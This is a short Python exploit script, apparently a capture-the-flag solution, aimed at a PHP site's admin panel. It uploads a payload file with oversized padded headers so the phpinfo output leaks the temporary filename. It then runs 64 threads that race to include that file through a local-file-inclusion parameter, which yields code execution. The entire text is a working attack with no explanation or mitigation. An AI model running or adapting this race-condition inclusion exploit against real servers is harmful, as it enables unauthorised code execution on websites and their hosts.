#!/usr/bin/python3 -W ignore

import requests
from multiprocessing.dummy import Pool as ThreadPool

padding = 'a'*4000
baseurl = 'https://gallery.nctfu.itac.club/' 
headers = {
    'HTTP_ACCEPT': padding,
    'HTTP_USER_AGENT': padding,
    'HTTP_ACCEPT_LANGUAGE': padding,
    'HTTP_PRAGMA': padding,
}
def find_name():
    phpinfo = 'https://gallery.nctfu.itac.club/adminpanel.php?a=' + padding
    fp = open('payload.txt', 'rb')
    files = {'u1f383': fp}
    r = requests.post(phpinfo, verify=False, files=files, headers=headers)
    idx = r.text.index('tmp_name') + 16
    fp.close()
    
    return r.text[idx:idx+len('/tmp/XXXXXXXXX')]

def exp(i):
    while True:
        name = find_name()
        r = requests.get(baseurl + '?p=' + name)
        
        if 'u1f383_in_here' in r.text:
            print("SUCCESS")
            break

pool = ThreadPool(64)
result = pool.map_async(exp, range(64)).get(0xffff)
